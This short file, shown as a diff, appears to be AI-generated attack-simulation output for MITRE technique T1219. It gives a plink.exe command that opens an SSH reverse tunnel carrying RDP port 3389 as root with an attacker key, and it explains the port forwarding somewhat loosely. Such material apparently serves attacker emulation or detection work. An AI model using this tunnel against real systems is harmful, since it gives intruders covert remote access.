@@ -1,0 +1,7 @@
+Based on the provided documentation and the objective to generate realistic command lines using only the tool Plink, I will simulate the attack behavior corresponding to MITRE technique T1219 (REMOTE ACCESS SOFTWARE) under TA0011 (COMMAND AND CONTROL).
+
+Command: `plink.exe -i <attacker_ssh_private_key> root@<target_machine_IP> -R 3389:localhost:3389`
+
+This command line establishes a secure connection using the provided SSH private key, authenticates as user "root" on the target machine with IP address `<target_machine_IP>`, and forwards local port 3389 to remote port 3389.
+
+Please note that I have used placeholders for the attacker's SSH private key file (`<attacker_ssh_private_key>`) and the target machine's IP address (`<target_machine_IP>`), as required by the policy.
